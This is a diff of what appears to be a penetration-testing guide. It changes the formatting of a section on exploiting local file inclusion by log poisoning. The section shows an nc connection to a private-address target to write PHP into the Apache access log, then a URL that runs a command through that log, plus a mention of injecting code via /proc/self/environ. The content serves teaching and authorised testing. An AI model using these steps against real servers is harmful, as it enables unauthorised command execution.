@@ -197,8 +197,9 @@ There are some requirements. We need to be able to read the apache2 log files, e
 
 So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.
 
-1. Insert php-code into the log file.
-   This can be done with nc or telnet.
+**Insert php-code into the log file**
+
+This can be done with nc or telnet.
 
 ```
 nc 192.168.1.102 80
@@ -225,14 +226,14 @@ Host: 192.168.1.159
 Connection: close
 ```
 
-1. Execute it
-   In the browser:
-   ```
-   http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
-   ```
+**Execute it in the browser**
+
+```
+http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
+```
 
 
-### /proc/self/environ
+### Proc files
 
 We can also inject code into /proc/self/environ through the user-agent
 
